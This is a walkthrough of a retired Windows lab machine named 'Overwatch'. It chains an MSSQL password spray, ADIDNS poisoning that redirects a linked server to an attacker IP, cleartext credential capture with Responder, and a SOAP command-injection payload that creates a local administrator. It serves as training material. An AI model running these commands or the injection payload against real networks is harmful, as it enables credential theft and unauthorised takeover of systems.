# Overwatch

![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white) ![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square) ![Released](https://img.shields.io/badge/Released-2026--01--24-informational?style=flat-square)

| | |
|---|---|
| **OS** | Windows |
| **Difficulty** | Medium |
| **Release** | January 24, 2026 |
| **Rating** | 4.7 / 5 |
| **Points** | — (retired; no longer awards points) |

## Summary

A password spray against MSSQL on a non-standard port (6520) lands `sqlsvc`, whose database rights are too limited for `xp_cmdshell`. The path forward is **ADIDNS poisoning**: any domain user can add DNS records, and the SQL Server has an unreachable linked server called `SQL07`. Pointing `SQL07` at the attacker and triggering a query against the link makes SQL Server authenticate outbound, and Responder captures `sqlmgmt`'s password in cleartext. That account has WinRM. Root comes from a WCF SOAP monitoring service bound to localhost:8000, whose `KillProcess` endpoint is command-injectable.

---

## Phase 1: Initial Enumeration

### Port scanning

```bash
nmap -sC -sV -oA overwatch_nmap <TARGET_IP>
```

Key ports:

- **53/tcp** — DNS
- **389/636/3268/tcp** — LDAP / Domain Controller
- **445/tcp** — SMB
- **3389/tcp** — RDP
- **5985/tcp** — WinRM
- **6520/tcp** — MSSQL (custom port)
- **8000/tcp** — HTTP (filtered externally — the internal monitoring service)
- **9389/tcp** — ADWS

### SMB enumeration

```bash
crackmapexec smb <TARGET_IP> -u '' -p '' --shares
smbclient -L //<TARGET_IP> -N
smbclient //<TARGET_IP>/software$ -N
```

Critical files in `software$/Monitoring/`:

- `overwatch.exe` — a WCF SOAP monitoring service
- `overwatch.exe.config` — contains the service URL `http://overwatch.htb:8000/MonitorService`
- Various DLLs, including `EntityFramework` and `System.Management.Automation`

### SQL Server discovery

```bash
mssqlclient.py 'guest:@<TARGET_IP>' -port 6520
```

Anonymous login is denied, but this confirms MSSQL on port 6520.

## Phase 2: Credential Discovery

### Password spray

```bash
crackmapexec mssql <TARGET_IP> -u users.txt -p passwords.txt \
  --port 6520 --continue-on-success
```

Hit: `sqlsvc:TI0LKcfHzZw1Vv`.

### SQL Server access

```bash
mssqlclient.py 'OVERWATCH/sqlsvc:TI0LKcfHzZw1Vv@<TARGET_IP>' -port 6520 -windows-auth
```

Database analysis:

- Limited permissions (guest on `master`, dbo on `overwatch`)
- Cannot enable advanced options or `xp_cmdshell`
- The `overwatch` database contains a single empty table, `Eventlog`

## Phase 3: User Enumeration

### RID brute force

```bash
crackmapexec smb <TARGET_IP> -u 'sqlsvc' -p 'TI0LKcfHzZw1Vv' --rid-brute
```

Key users:

- **sqlmgmt (RID 1105)** — a SQL management account, the obvious target
- Computer accounts: `SQL03$`, `SQL07$`, `NB001$`, `FILE01$`
- Domain users: Charlie.Moss, Tracy.Burns, and others

Note that `SQL07$` exists as a computer account — which lines up with the linked server below.

## Phase 4: ADIDNS Poisoning Attack

### Understanding the attack

- Every domain user holds the default privilege to add DNS records in Active Directory.
- SQL Server has a linked server, `SQL07`, configured but unreachable.
- Poisoning DNS to redirect `SQL07` to our IP captures the outbound authentication.

### Step 1: DNS record enumeration

```bash
adidnsdump -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' <TARGET_IP>
```

### Step 2: Clone the DNS poisoning toolkit

```bash
git clone https://github.com/dirkjanm/krbrelayx
cd krbrelayx
```

### Step 3: Add the malicious DNS record

```bash
python3 dnstool.py -u 'OVERWATCH\sqlsvc' -p 'TI0LKcfHzZw1Vv' \
  -r SQL07 -a add -t A -d <ATTACKER_IP> <TARGET_IP>
```

Expected output: `[+] LDAP operation completed successfully`.

### Step 4: Start Responder

```bash
responder -I tun0 -v
```

### Step 5: Trigger authentication (from the SQL session)

```sql
EXEC ('SELECT 1') AT [SQL07];
```

### Step 6: Capture the credentials

```
[MSSQL] Received connection from <TARGET_IP>
[MSSQL] Cleartext Username : sqlmgmt
[MSSQL] Cleartext Password : bIhBbzMMnB82yx
```

Cleartext credentials captured: `sqlmgmt:bIhBbzMMnB82yx`.

## Phase 5: Initial Access

```bash
evil-winrm -i <TARGET_IP> -u sqlmgmt -p bIhBbzMMnB82yx
```

WinRM shell as `overwatch\sqlmgmt`.

```powershell
type C:\Users\sqlmgmt\Desktop\user.txt
```

## Phase 6: Privilege Escalation

### Access the internal monitoring service

Port 8000 is filtered externally but reachable from inside:

```powershell
curl http://127.0.0.1:8000/MonitorService -UseBasicParsing
```

### SOAP command injection

The service's `KillProcess` endpoint passes its `processName` argument to a shell:

```powershell
$body = '<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>notepad; net user pwn Password123! /add; net localgroup administrators pwn /add</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>'

Invoke-WebRequest -Uri "http://127.0.0.1:8000/MonitorService" -Method POST `
  -Body $body -ContentType "text/xml; charset=utf-8" `
  -Headers @{"SOAPAction"="http://tempuri.org/IMonitoringService/KillProcess"} `
  -UseBasicParsing
```

### Verify and use the new admin account

```powershell
net user pwn
```

User `pwn` is created with Administrator privileges.

```bash
evil-winrm -i <TARGET_IP> -u pwn -p Password123!
```

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

## Attack Chain Summary

```
Password spray → sqlsvc:TI0LKcfHzZw1Vv (SQL)
    ↓
RID brute force → discover sqlmgmt account
    ↓
ADIDNS poisoning: add malicious DNS record SQL07 → attacker IP
    ↓
SQL linked server auth → sqlmgmt:bIhBbzMMnB82yx (cleartext)
    ↓
evil-winrm → user flag
    ↓
SOAP command injection → Administrator → root flag
```

## Key Learning Points

1. **ADIDNS exploitation** — default domain user privileges allow DNS record manipulation.
2. **SQL linked servers** can be leveraged for credential capture via DNS poisoning.
3. **Internal services** — ports filtered externally may be wide open from inside.
4. **SOAP injection** — XML-based services are just as vulnerable to command injection as anything else.
5. **Cleartext capture** — some protocols transmit credentials in cleartext during authentication, which makes Responder far more valuable than a hash capture.

## Alternative Attack Vectors (Failed)

- `xp_cmdshell` — insufficient privileges
- SMB poisoning via `xp_dirtree` — no auth captured
- Password spraying against domain accounts
- AS-REP roasting — no vulnerable users
- Direct RDP access

The ADIDNS poisoning attack was the intended and successful path to initial access.

## Tools Used

nmap, crackmapexec, smbclient, `mssqlclient.py`, adidnsdump, krbrelayx, Responder, evil-winrm, and standard PowerShell cmdlets.

---

*Retired machine. Flag values are deliberately omitted — see the [repository README](../../README.md#ethics-and-policy).*
